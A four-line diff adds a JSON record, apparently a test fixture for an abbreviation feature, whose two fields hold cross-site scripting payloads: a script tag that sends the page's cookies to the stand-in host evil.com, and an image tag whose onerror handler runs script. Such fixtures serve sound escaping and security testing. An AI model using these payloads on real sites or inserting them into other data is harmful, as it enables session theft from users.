@@ -1,0 +1,4 @@
+{
+    "abbreviation": "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
+    "fullForm": "<img src=x onerror='alert(1)'>"
+}
